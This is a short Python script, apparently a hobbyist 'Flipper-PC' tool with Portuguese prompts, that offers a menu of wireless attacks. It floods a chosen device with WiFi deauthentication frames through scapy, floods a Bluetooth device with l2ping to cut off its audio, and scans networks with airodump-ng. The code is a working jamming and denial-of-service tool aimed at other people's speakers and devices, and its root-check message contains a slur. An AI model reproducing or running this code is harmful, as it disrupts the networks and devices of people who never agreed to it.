import os
import sys
from scapy.all import *

interface_wifi = "wlan0"
interface_bt = "hci0"

class FlipperPC:
    def __init__(self):
        os.system('clear')
        print("--- FLIPPER-PC BY MYSTHIC-FOX ---")

    def derrubar_wifi(self, alvo, roteador):
        print(f"Alvo: {alvo} -> Tchau tchau...")
        pacote = RadioTap()/Dot11(addr1=alvo, addr2=roteador, addr3=roteador)/Dot11Deauth(reason=7)
        sendp(pacote, iface=interface_wifi, count=5000, inter=0.05, verbose=False)

    def travar_bluetooth(self, alvo):
        print(f"Inundando {alvo}... A música vai parar.")
        os.system(f"sudo l2ping -f -s 800 {alvo}")

    def scan_geral(self):
        print("Escaneando tudo ao redor...")
        os.system(f"sudo airodump-ng {interface_wifi}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Roda isso como root (sudo), senão não vai funcionar, retardado.")
        sys.exit()

    flipper = FlipperPC()
    
    print("\n[1] Ver quem ta no ar (WiFi)")
    print("[2] Silenciar caixa no WiFi")
    print("[3] Travar caixa no Bluetooth")
    
    op = input("\nO que vamos fazer hoje? > ")

    if op == "1":
        flipper.scan_geral()
    elif op == "2":
        mac = input("MAC da caixa: ")
        router = input("MAC do roteador: ")
        flipper.derrubar_wifi(mac, router)
    elif op == "3":
        mac_bt = input("MAC do Bluetooth: ")
        flipper.travar_bluetooth(mac_bt)
